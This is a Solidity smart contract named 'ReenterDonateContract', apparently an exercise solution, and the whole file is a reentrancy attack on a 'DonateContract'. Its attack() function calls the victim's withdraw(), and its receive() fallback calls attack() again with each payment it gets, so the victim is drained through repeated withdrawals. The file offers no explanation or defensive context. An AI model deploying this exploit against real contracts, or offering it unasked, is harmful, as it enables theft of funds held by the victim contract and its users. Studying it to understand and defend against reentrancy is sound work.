// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DonateContract {
    function withdraw(uint256 _amount) external;
}

contract ReenterDonateContract {
    address public victimAddress;

    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
    }

    function attack(uint256 amount) public {
        DonateContract victim = DonateContract(victimAddress);
        victim.withdraw(amount);
    }

    receive() external payable {
        attack(msg.value);
    }
}
